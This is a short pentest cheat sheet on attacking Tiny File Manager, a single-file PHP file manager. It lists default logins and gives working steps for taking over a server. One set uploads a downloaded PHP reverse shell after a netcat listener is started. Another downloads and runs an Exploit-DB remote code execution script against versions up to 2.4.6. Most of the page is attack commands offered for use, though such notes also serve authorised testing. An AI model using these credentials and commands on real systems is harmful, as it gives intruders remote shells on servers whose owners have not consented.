# Tiny File Manager

Tiny File Manager is a simple and small file manager with single php file.

### Default Credentials <a href="#default-credentials" id="default-credentials"></a>

```
admin:admin@123
user:12345
```

### Reverse Shell <a href="#reverse-shell" id="reverse-shell"></a>

If we can login and access the dashboard of the Tiny File Manager, upload the reverse shell script and get a shell.\
First, download the reverse shell script.

```
wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php -O shell.php
```

Update values of **“$ip”** and **“$port”** in the above script to our local ip and port for listener which will start. Then upload the script to the arbitrary folder in the Tiny File Manager dashboard.

Now start netcat listener.

```
nc -lvnp 4444
```

Access the page with the uploaded script. e.g. "http://vulnerable.com/uploads/shell.php".\
We should get a target shell.

### Remote Code Execution (RCE) Version≤2.4.6 <a href="#remote-code-execution-rce-version246" id="remote-code-execution-rce-version246"></a>

The payload can be downloaded from [Exploit-DB](https://www.exploit-db.com/exploits/50828)

```
wget https://www.exploit-db.com/raw/50828 -O exploit.sh
dos2unix exploit.sh
chmod +x exploit.sh
./exploit.sh http://vulnerable.com/index.php admin "admin@123"
```

If you got the “jq not found” error, install it and run again.

```
sudo apt install jq
```

### References <a href="#references" id="references"></a>

* [Tiny File Manager](https://github.com/prasathmani/tinyfilemanager)
